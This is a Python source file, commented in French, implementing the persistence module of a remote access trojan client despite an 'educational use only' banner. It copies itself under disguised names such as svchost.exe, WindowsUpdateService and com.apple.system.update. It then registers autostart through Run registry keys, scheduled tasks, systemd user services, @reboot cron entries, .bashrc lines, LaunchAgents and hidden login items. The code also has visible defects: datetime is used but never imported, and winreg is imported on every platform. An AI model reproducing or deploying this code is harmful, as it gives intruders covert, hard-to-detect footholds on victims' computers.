"""
Persistence Manager - Gestionnaire de persistance pour le client RAT
⚠️ USAGE ÉDUCATIF UNIQUEMENT ⚠️
Implémentation des techniques de persistance multi-plateformes
"""

import os
import sys
import shutil
import platform
import subprocess
import winreg
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple
import logging

logger = logging.getLogger(__name__)

class PersistenceManager:
    """
    Gestionnaire de persistance multi-plateforme
    
    GARDE-FOUS DE SÉCURITÉ:
    - Installation uniquement dans l'espace utilisateur
    - Pas de modification des fichiers système critiques
    - Désinstallation complète possible
    - Logs de toutes les actions
    """
    
    def __init__(self):
        self.system = platform.system().lower()
        self.current_executable = sys.executable if hasattr(sys, 'frozen') else __file__
        self.install_methods = []
        
        # Chemins d'installation selon l'OS
        self._setup_install_paths()
        
        # Méthodes disponibles selon l'OS
        self._setup_available_methods()
        
        logger.info(f"PersistenceManager initialisé pour {self.system}")
    
    def _setup_install_paths(self):
        """Configure les chemins d'installation selon l'OS"""
        if self.system == 'windows':
            self.install_dir = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows')
            self.executable_name = 'svchost.exe'
            self.service_name = 'WindowsUpdateService'
            
        elif self.system == 'linux':
            home = os.path.expanduser('~')
            self.install_dir = os.path.join(home, '.local', 'share', 'systemd')
            self.executable_name = 'systemd-worker'
            self.service_name = 'systemd-update'
            
        elif self.system == 'darwin':
            home = os.path.expanduser('~')
            self.install_dir = os.path.join(home, 'Library', 'Application Support', 'System')
            self.executable_name = 'system_update'
            self.service_name = 'com.apple.system.update'
            
        else:
            # Système non supporté
            self.install_dir = os.path.expanduser('~')
            self.executable_name = 'system_service'
            self.service_name = 'system_update'
    
    def _setup_available_methods(self):
        """Détermine les méthodes de persistance disponibles"""
        if self.system == 'windows':
            self.install_methods = [
                'startup_folder',
                'registry_run',
                'scheduled_task',
                'wmi_event'
            ]
        elif self.system == 'linux':
            self.install_methods = [
                'systemd_user',
                'cron_job',
                'autostart_desktop',
                'bashrc_alias'
            ]
        elif self.system == 'darwin':
            self.install_methods = [
                'launchd_agent',
                'login_items',
                'cron_job'
            ]
        else:
            self.install_methods = ['cron_job']
    
    def install(self, methods: List[str] = None) -> bool:
        """
        Installe la persistance avec les méthodes spécifiées
        
        Args:
            methods: Liste des méthodes à utiliser (None = toutes disponibles)
        
        Returns:
            bool: True si au moins une méthode a réussi
        """
        if methods is None:
            methods = self.install_methods
        
        success_count = 0
        total_methods = len(methods)
        
        logger.info(f"Installation de la persistance avec {total_methods} méthodes")
        
        # Installation de l'exécutable
        if not self._install_executable():
            logger.error("Échec de l'installation de l'exécutable")
            return False
        
        # Installation des méthodes de persistance
        for method in methods:
            try:
                if self._install_method(method):
                    success_count += 1
                    logger.info(f"Méthode {method} installée avec succès")
                else:
                    logger.warning(f"Échec installation méthode {method}")
            except Exception as e:
                logger.error(f"Erreur installation {method}: {e}")
        
        # Sauvegarde des informations d'installation
        self._save_install_info(methods)
        
        installed_ratio = success_count / total_methods if total_methods > 0 else 0
        logger.info(f"Persistance installée: {success_count}/{total_methods} méthodes réussies")
        
        return success_count > 0
    
    def uninstall(self) -> bool:
        """
        Désinstalle complètement la persistance
        
        Returns:
            bool: True si la désinstallation est complète
        """
        logger.info("Désinstallation de la persistance")
        
        success_count = 0
        
        # Lecture des informations d'installation
        install_info = self._load_install_info()
        methods_used = install_info.get('methods_used', self.install_methods)
        
        # Désinstallation de chaque méthode
        for method in methods_used:
            try:
                if self._uninstall_method(method):
                    success_count += 1
                    logger.info(f"Méthode {method} désinstallée")
                else:
                    logger.warning(f"Échec désinstallation {method}")
            except Exception as e:
                logger.error(f"Erreur désinstallation {method}: {e}")
        
        # Suppression de l'exécutable installé
        if self._uninstall_executable():
            success_count += 1
        
        # Suppression des informations d'installation
        self._remove_install_info()
        
        logger.info(f"Désinstallation terminée: {success_count} opérations réussies")
        
        return success_count > 0
    
    def _install_executable(self) -> bool:
        """Copie l'exécutable vers le répertoire d'installation"""
        try:
            # Création du répertoire d'installation
            os.makedirs(self.install_dir, exist_ok=True)
            
            # Chemin de destination
            dest_path = os.path.join(self.install_dir, self.executable_name)
            
            # Copie de l'exécutable
            if os.path.exists(self.current_executable):
                shutil.copy2(self.current_executable, dest_path)
                
                # Définition des permissions (exécutable)
                if self.system != 'windows':
                    os.chmod(dest_path, 0o755)
                
                logger.info(f"Exécutable copié vers {dest_path}")
                return True
            else:
                logger.error(f"Exécutable source non trouvé: {self.current_executable}")
                return False
                
        except Exception as e:
            logger.error(f"Erreur copie exécutable: {e}")
            return False
    
    def _uninstall_executable(self) -> bool:
        """Supprime l'exécutable installé"""
        try:
            dest_path = os.path.join(self.install_dir, self.executable_name)
            
            if os.path.exists(dest_path):
                os.unlink(dest_path)
                logger.info(f"Exécutable supprimé: {dest_path}")
            
            # Suppression du répertoire s'il est vide
            try:
                if os.path.exists(self.install_dir) and not os.listdir(self.install_dir):
                    os.rmdir(self.install_dir)
            except:
                pass
            
            return True
            
        except Exception as e:
            logger.error(f"Erreur suppression exécutable: {e}")
            return False
    
    def _install_method(self, method: str) -> bool:
        """Installe une méthode de persistance spécifique"""
        if self.system == 'windows':
            return self._install_windows_method(method)
        elif self.system == 'linux':
            return self._install_linux_method(method)
        elif self.system == 'darwin':
            return self._install_darwin_method(method)
        else:
            return False
    
    def _uninstall_method(self, method: str) -> bool:
        """Désinstalle une méthode de persistance spécifique"""
        if self.system == 'windows':
            return self._uninstall_windows_method(method)
        elif self.system == 'linux':
            return self._uninstall_linux_method(method)
        elif self.system == 'darwin':
            return self._uninstall_darwin_method(method)
        else:
            return False
    
    # === MÉTHODES WINDOWS ===
    
    def _install_windows_method(self, method: str) -> bool:
        """Installe une méthode de persistance Windows"""
        executable_path = os.path.join(self.install_dir, self.executable_name)
        
        if method == 'startup_folder':
            return self._install_windows_startup_folder(executable_path)
        elif method == 'registry_run':
            return self._install_windows_registry_run(executable_path)
        elif method == 'scheduled_task':
            return self._install_windows_scheduled_task(executable_path)
        elif method == 'wmi_event':
            return self._install_windows_wmi_event(executable_path)
        else:
            return False
    
    def _install_windows_startup_folder(self, executable_path: str) -> bool:
        """Installation via le dossier de démarrage Windows"""
        try:
            startup_folder = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            
            shortcut_path = os.path.join(startup_folder, f"{self.service_name}.lnk")
            
            # Création du raccourci avec COM
            import win32com.client
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = executable_path
            shortcut.WorkingDirectory = self.install_dir
            shortcut.save()
            
            logger.info("Raccourci de démarrage créé")
            return True
            
        except ImportError:
            # Fallback sans win32com
            return self._create_batch_startup(executable_path)
        except Exception as e:
            logger.error(f"Erreur startup folder: {e}")
            return False
    
    def _create_batch_startup(self, executable_path: str) -> bool:
        """Création d'un batch file de démarrage (fallback)"""
        try:
            startup_folder = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            
            batch_path = os.path.join(startup_folder, f"{self.service_name}.bat")
            
            with open(batch_path, 'w') as f:
                f.write(f'@echo off\n')
                f.write(f'start "" "{executable_path}"\n')
            
            return True
            
        except Exception as e:
            logger.error(f"Erreur batch startup: {e}")
            return False
    
    def _install_windows_registry_run(self, executable_path: str) -> bool:
        """Installation via la clé de registre Run"""
        try:
            import winreg
            
            # Ouverture de la clé HKCU\Software\Microsoft\Windows\CurrentVersion\Run
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_WRITE
            )
            
            # Ajout de la valeur
            winreg.SetValueEx(key, self.service_name, 0, winreg.REG_SZ, executable_path)
            winreg.CloseKey(key)
            
            logger.info("Clé de registre Run créée")
            return True
            
        except Exception as e:
            logger.error(f"Erreur registry run: {e}")
            return False
    
    def _install_windows_scheduled_task(self, executable_path: str) -> bool:
        """Installation via une tâche planifiée"""
        try:
            # Commande pour créer une tâche planifiée
            cmd = [
                'schtasks', '/create',
                '/tn', self.service_name,
                '/tr', executable_path,
                '/sc', 'onlogon',
                '/f'  # Force la création
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                logger.info("Tâche planifiée créée")
                return True
            else:
                logger.error(f"Erreur création tâche: {result.stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Erreur scheduled task: {e}")
            return False
    
    def _install_windows_wmi_event(self, executable_path: str) -> bool:
        """Installation via un événement WMI (méthode avancée)"""
        try:
            # Cette méthode est plus complexe et nécessite des privilèges
            # Pour l'instant, on utilise une approche simple
            logger.warning("WMI event persistence non implémentée")
            return False
            
        except Exception as e:
            logger.error(f"Erreur WMI event: {e}")
            return False
    
    def _uninstall_windows_method(self, method: str) -> bool:
        """Désinstalle une méthode Windows"""
        if method == 'startup_folder':
            return self._uninstall_windows_startup_folder()
        elif method == 'registry_run':
            return self._uninstall_windows_registry_run()
        elif method == 'scheduled_task':
            return self._uninstall_windows_scheduled_task()
        elif method == 'wmi_event':
            return self._uninstall_windows_wmi_event()
        else:
            return False
    
    def _uninstall_windows_startup_folder(self) -> bool:
        """Suppression du raccourci de démarrage"""
        try:
            startup_folder = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            
            # Suppression du raccourci et du batch
            shortcut_path = os.path.join(startup_folder, f"{self.service_name}.lnk")
            batch_path = os.path.join(startup_folder, f"{self.service_name}.bat")
            
            for path in [shortcut_path, batch_path]:
                if os.path.exists(path):
                    os.unlink(path)
                    logger.info(f"Supprimé: {path}")
            
            return True
            
        except Exception as e:
            logger.error(f"Erreur suppression startup: {e}")
            return False
    
    def _uninstall_windows_registry_run(self) -> bool:
        """Suppression de la clé de registre Run"""
        try:
            import winreg
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_WRITE
            )
            
            try:
                winreg.DeleteValue(key, self.service_name)
                logger.info("Clé de registre supprimée")
                return True
            except FileNotFoundError:
                # La clé n'existe pas
                return True
            finally:
                winreg.CloseKey(key)
                
        except Exception as e:
            logger.error(f"Erreur suppression registry: {e}")
            return False
    
    def _uninstall_windows_scheduled_task(self) -> bool:
        """Suppression de la tâche planifiée"""
        try:
            cmd = ['schtasks', '/delete', '/tn', self.service_name, '/f']
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                logger.info("Tâche planifiée supprimée")
                return True
            else:
                # La tâche n'existe peut-être pas
                logger.info("Tâche planifiée non trouvée")
                return True
                
        except Exception as e:
            logger.error(f"Erreur suppression tâche: {e}")
            return False
    
    def _uninstall_windows_wmi_event(self) -> bool:
        """Suppression de l'événement WMI"""
        # Non implémenté pour l'instant
        return True
    
    # === MÉTHODES LINUX ===
    
    def _install_linux_method(self, method: str) -> bool:
        """Installe une méthode de persistance Linux"""
        executable_path = os.path.join(self.install_dir, self.executable_name)
        
        if method == 'systemd_user':
            return self._install_linux_systemd_user(executable_path)
        elif method == 'cron_job':
            return self._install_linux_cron_job(executable_path)
        elif method == 'autostart_desktop':
            return self._install_linux_autostart_desktop(executable_path)
        elif method == 'bashrc_alias':
            return self._install_linux_bashrc_alias(executable_path)
        else:
            return False
    
    def _install_linux_systemd_user(self, executable_path: str) -> bool:
        """Installation via systemd user"""
        try:
            home = os.path.expanduser('~')
            systemd_dir = os.path.join(home, '.config', 'systemd', 'user')
            os.makedirs(systemd_dir, exist_ok=True)
            
            service_file = os.path.join(systemd_dir, f"{self.service_name}.service")
            
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={executable_path}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
            
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            # Activation du service
            subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True)
            subprocess.run(['systemctl', '--user', 'enable', f"{self.service_name}.service"], capture_output=True)
            
            logger.info("Service systemd user créé")
            return True
            
        except Exception as e:
            logger.error(f"Erreur systemd user: {e}")
            return False
    
    def _install_linux_cron_job(self, executable_path: str) -> bool:
        """Installation via cron job"""
        try:
            # Lecture du crontab actuel
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            # Ajout de la tâche cron
            cron_line = f"@reboot {executable_path}\n"
            
            if cron_line.strip() not in current_cron:
                new_cron = current_cron + cron_line
                
                # Écriture du nouveau crontab
                proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                proc.communicate(input=new_cron)
                
                if proc.returncode == 0:
                    logger.info("Tâche cron créée")
                    return True
            else:
                logger.info("Tâche cron déjà présente")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Erreur cron job: {e}")
            return False
    
    def _install_linux_autostart_desktop(self, executable_path: str) -> bool:
        """Installation via fichier .desktop autostart"""
        try:
            home = os.path.expanduser('~')
            autostart_dir = os.path.join(home, '.config', 'autostart')
            os.makedirs(autostart_dir, exist_ok=True)
            
            desktop_file = os.path.join(autostart_dir, f"{self.service_name}.desktop")
            
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=System Update Service
Exec={executable_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            
            with open(desktop_file, 'w') as f:
                f.write(desktop_content)
            
            logger.info("Fichier autostart .desktop créé")
            return True
            
        except Exception as e:
            logger.error(f"Erreur autostart desktop: {e}")
            return False
    
    def _install_linux_bashrc_alias(self, executable_path: str) -> bool:
        """Installation via ajout dans .bashrc"""
        try:
            home = os.path.expanduser('~')
            bashrc_path = os.path.join(home, '.bashrc')
            
            # Ligne à ajouter
            alias_line = f"# System update service\n{executable_path} &\n"
            
            if os.path.exists(bashrc_path):
                with open(bashrc_path, 'r') as f:
                    content = f.read()
                
                if executable_path not in content:
                    with open(bashrc_path, 'a') as f:
                        f.write('\n' + alias_line)
                    
                    logger.info("Alias bashrc ajouté")
                    return True
            
            return False
            
        except Exception as e:
            logger.error(f"Erreur bashrc alias: {e}")
            return False
    
    def _uninstall_linux_method(self, method: str) -> bool:
        """Désinstalle une méthode Linux"""
        if method == 'systemd_user':
            return self._uninstall_linux_systemd_user()
        elif method == 'cron_job':
            return self._uninstall_linux_cron_job()
        elif method == 'autostart_desktop':
            return self._uninstall_linux_autostart_desktop()
        elif method == 'bashrc_alias':
            return self._uninstall_linux_bashrc_alias()
        else:
            return False
    
    def _uninstall_linux_systemd_user(self) -> bool:
        """Suppression du service systemd user"""
        try:
            home = os.path.expanduser('~')
            service_file = os.path.join(home, '.config', 'systemd', 'user', f"{self.service_name}.service")
            
            # Désactivation et suppression du service
            subprocess.run(['systemctl', '--user', 'disable', f"{self.service_name}.service"], capture_output=True)
            subprocess.run(['systemctl', '--user', 'stop', f"{self.service_name}.service"], capture_output=True)
            
            if os.path.exists(service_file):
                os.unlink(service_file)
                logger.info("Service systemd supprimé")
            
            subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True)
            return True
            
        except Exception as e:
            logger.error(f"Erreur suppression systemd: {e}")
            return False
    
    def _uninstall_linux_cron_job(self) -> bool:
        """Suppression de la tâche cron"""
        try:
            executable_path = os.path.join(self.install_dir, self.executable_name)
            
            # Lecture du crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            if result.returncode != 0:
                return True  # Pas de crontab
            
            # Suppression des lignes contenant notre exécutable
            lines = result.stdout.split('\n')
            new_lines = [line for line in lines if executable_path not in line]
            
            if len(new_lines) != len(lines):
                # Écriture du nouveau crontab
                proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                proc.communicate(input='\n'.join(new_lines))
                
                logger.info("Tâche cron supprimée")
            
            return True
            
        except Exception as e:
            logger.error(f"Erreur suppression cron: {e}")
            return False
    
    def _uninstall_linux_autostart_desktop(self) -> bool:
        """Suppression du fichier .desktop autostart"""
        try:
            home = os.path.expanduser('~')
            desktop_file = os.path.join(home, '.config', 'autostart', f"{self.service_name}.desktop")
            
            if os.path.exists(desktop_file):
                os.unlink(desktop_file)
                logger.info("Fichier autostart supprimé")
            
            return True
            
        except Exception as e:
            logger.error(f"Erreur suppression autostart: {e}")
            return False
    
    def _uninstall_linux_bashrc_alias(self) -> bool:
        """Suppression de l'alias bashrc"""
        try:
            home = os.path.expanduser('~')
            bashrc_path = os.path.join(home, '.bashrc')
            executable_path = os.path.join(self.install_dir, self.executable_name)
            
            if os.path.exists(bashrc_path):
                with open(bashrc_path, 'r') as f:
                    lines = f.readlines()
                
                # Suppression des lignes contenant notre exécutable
                new_lines = [line for line in lines if executable_path not in line]
                
                if len(new_lines) != len(lines):
                    with open(bashrc_path, 'w') as f:
                        f.writelines(new_lines)
                    
                    logger.info("Alias bashrc supprimé")
            
            return True
            
        except Exception as e:
            logger.error(f"Erreur suppression bashrc: {e}")
            return False
    
    # === MÉTHODES DARWIN (macOS) ===
    
    def _install_darwin_method(self, method: str) -> bool:
        """Installe une méthode de persistance macOS"""
        executable_path = os.path.join(self.install_dir, self.executable_name)
        
        if method == 'launchd_agent':
            return self._install_darwin_launchd_agent(executable_path)
        elif method == 'login_items':
            return self._install_darwin_login_items(executable_path)
        elif method == 'cron_job':
            return self._install_linux_cron_job(executable_path)  # Même logique que Linux
        else:
            return False
    
    def _install_darwin_launchd_agent(self, executable_path: str) -> bool:
        """Installation via LaunchAgent"""
        try:
            home = os.path.expanduser('~')
            launchd_dir = os.path.join(home, 'Library', 'LaunchAgents')
            os.makedirs(launchd_dir, exist_ok=True)
            
            plist_file = os.path.join(launchd_dir, f"{self.service_name}.plist")
            
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{self.service_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{executable_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
            
            with open(plist_file, 'w') as f:
                f.write(plist_content)
            
            # Chargement du LaunchAgent
            subprocess.run(['launchctl', 'load', plist_file], capture_output=True)
            
            logger.info("LaunchAgent créé")
            return True
            
        except Exception as e:
            logger.error(f"Erreur LaunchAgent: {e}")
            return False
    
    def _install_darwin_login_items(self, executable_path: str) -> bool:
        """Installation via Login Items (nécessite osascript)"""
        try:
            script = f'''tell application "System Events"
                make login item at end with properties {{path:"{executable_path}", hidden:true}}
            end tell'''
            
            result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
            
            if result.returncode == 0:
                logger.info("Login Item ajouté")
                return True
            else:
                logger.error(f"Erreur Login Item: {result.stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Erreur login items: {e}")
            return False
    
    def _uninstall_darwin_method(self, method: str) -> bool:
        """Désinstalle une méthode macOS"""
        if method == 'launchd_agent':
            return self._uninstall_darwin_launchd_agent()
        elif method == 'login_items':
            return self._uninstall_darwin_login_items()
        elif method == 'cron_job':
            return self._uninstall_linux_cron_job()  # Même logique que Linux
        else:
            return False
    
    def _uninstall_darwin_launchd_agent(self) -> bool:
        """Suppression du LaunchAgent"""
        try:
            home = os.path.expanduser('~')
            plist_file = os.path.join(home, 'Library', 'LaunchAgents', f"{self.service_name}.plist")
            
            # Déchargement et suppression
            subprocess.run(['launchctl', 'unload', plist_file], capture_output=True)
            
            if os.path.exists(plist_file):
                os.unlink(plist_file)
                logger.info("LaunchAgent supprimé")
            
            return True
            
        except Exception as e:
            logger.error(f"Erreur suppression LaunchAgent: {e}")
            return False
    
    def _uninstall_darwin_login_items(self) -> bool:
        """Suppression des Login Items"""
        try:
            executable_path = os.path.join(self.install_dir, self.executable_name)
            
            script = f'''tell application "System Events"
                delete login items whose path is "{executable_path}"
            end tell'''
            
            subprocess.run(['osascript', '-e', script], capture_output=True)
            logger.info("Login Items supprimés")
            return True
            
        except Exception as e:
            logger.error(f"Erreur suppression login items: {e}")
            return False
    
    # === GESTION DES INFORMATIONS D'INSTALLATION ===
    
    def _save_install_info(self, methods_used: List[str]):
        """Sauvegarde les informations d'installation"""
        try:
            import json
            
            info = {
                'install_date': datetime.now().isoformat(),
                'system': self.system,
                'methods_used': methods_used,
                'install_dir': self.install_dir,
                'executable_name': self.executable_name,
                'service_name': self.service_name
            }
            
            info_file = os.path.join(self.install_dir, '.install_info')
            with open(info_file, 'w') as f:
                json.dump(info, f, indent=2)
            
            # Fichier caché sur Unix
            if self.system != 'windows':
                os.chmod(info_file, 0o600)
                
        except Exception as e:
            logger.error(f"Erreur sauvegarde info install: {e}")
    
    def _load_install_info(self) -> Dict[str, Any]:
        """Charge les informations d'installation"""
        try:
            import json
            
            info_file = os.path.join(self.install_dir, '.install_info')
            if os.path.exists(info_file):
                with open(info_file, 'r') as f:
                    return json.load(f)
            
            return {}
            
        except Exception as e:
            logger.error(f"Erreur chargement info install: {e}")
            return {}
    
    def _remove_install_info(self):
        """Supprime les informations d'installation"""
        try:
            info_file = os.path.join(self.install_dir, '.install_info')
            if os.path.exists(info_file):
                os.unlink(info_file)
                
        except Exception as e:
            logger.error(f"Erreur suppression info install: {e}")
    
    def check_persistence_status(self) -> Dict[str, Any]:
        """Vérifie le statut de la persistance"""
        try:
            install_info = self._load_install_info()
            
            if not install_info:
                return {
                    'installed': False,
                    'methods': [],
                    'install_date': None
                }
            
            # Vérification de chaque méthode
            methods_status = {}
            for method in install_info.get('methods_used', []):
                methods_status[method] = self._check_method_status(method)
            
            return {
                'installed': any(methods_status.values()),
                'methods': methods_status,
                'install_date': install_info.get('install_date'),
                'install_info': install_info
            }
            
        except Exception as e:
            logger.error(f"Erreur vérification statut: {e}")
            return {'installed': False, 'error': str(e)}
    
    def _check_method_status(self, method: str) -> bool:
        """Vérifie si une méthode spécifique est active"""
        try:
            # Implémentation basique - peut être améliorée
            if self.system == 'windows':
                if method == 'registry_run':
                    try:
                        import winreg
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
                        winreg.QueryValueEx(key, self.service_name)
                        winreg.CloseKey(key)
                        return True
                    except:
                        return False
                        
            elif self.system == 'linux':
                if method == 'systemd_user':
                    home = os.path.expanduser('~')
                    service_file = os.path.join(home, '.config', 'systemd', 'user', f"{self.service_name}.service")
                    return os.path.exists(service_file)
            
            # Pour les autres méthodes, vérification de base
            return True  # Assume active si pas d'erreur lors de l'installation
            
        except Exception:
            return False